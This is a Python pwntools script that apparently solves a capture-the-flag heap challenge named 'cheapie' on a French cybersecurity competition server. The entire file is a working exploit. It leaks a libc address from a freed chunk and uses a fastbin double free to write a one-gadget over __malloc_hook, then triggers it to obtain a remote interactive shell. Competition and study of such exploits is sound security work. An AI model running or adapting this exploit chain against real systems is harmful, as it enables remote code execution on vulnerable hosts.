from pwn import *


def malloc(io, size, content):
    io.recv()
    io.sendline("1")
    io.recv()
    io.sendline(str(size))
    addr = io.recvline().decode('utf-8')
    addr = int(addr.split(' ')[2], 16)
    io.recvline()
    io.send(content)
    return addr

def free(io, addr):
    io.recv()
    io.sendline("2")
    io.recv()
    io.sendline(hex(addr))
    io.recvline()

def debug(io, addr):
    io.recv()
    io.sendline("3")
    io.recv()
    io.sendline(hex(addr))
    leak = io.recvline()[:-1].decode('utf-8')
    
    leaks = leak.split(' ')
    addr1 = ""
    addr2 = ""
    for i in range(8):
        addr1 = leaks[i]+addr1
        addr2 = leaks[i+8] + addr2
    return int(addr1, 16), int(addr2, 16)

#io = process('cheapie')
io = remote('challenges2.france-cybersecurity-challenge.fr', 4006)

script='''
tbreak main
b exit
b execve
'''

libc = ELF('libc-2.23.so')

#pid = gdb.attach(io, gdbscript=script)

#Leaking memory first by showing a free chunk

addr1 = malloc(io, 0x80, 'aa')
addr2 = malloc(io, 0x80, 'aa')

free(io, addr1)
leak = debug(io, addr1)[0]
main_arena_offset = 0x3c4b78
libc_base = leak - main_arena_offset
system_offset = 0x453a0
system = libc_base + system_offset
malloc_hook_offset = libc.sym.__malloc_hook
malloc_hook = libc_base +malloc_hook_offset
print("libc", hex(libc_base))
print("system", hex(system))
print("malloc_hook_", hex(malloc_hook))

# going back to initial state
free(io, addr2)

addr3 = malloc(io, 0x68, 'A'*10)
addr4 = malloc(io, 0x68, 'A'*10)
addr5 = malloc(io, 0x80, 'A'*10) # Prevents consolidation

free(io, addr4)
free(io, addr3)
free(io, addr4)

print("addr3", hex(addr3))
print("addr4", hex(addr4))

# Valid chunk at malloc_hook - 0x23
print(hex(malloc(io, 0x68, p64(malloc_hook - 0x23))))
print(hex(malloc(io, 0x68, 'A')))
print(hex(malloc(io, 0x68, '1')))

gadget_offset = 0xf1207
gadget = libc_base + gadget_offset

# Putting one gadget at malloc_hook
print(hex(malloc(io, 0x68, b'A'*0x13 + p64(gadget))))

# Last malloc to trigger exploit
io.recv()
io.sendline('1')
io.recv()
io.sendline('16')

io.interactive()
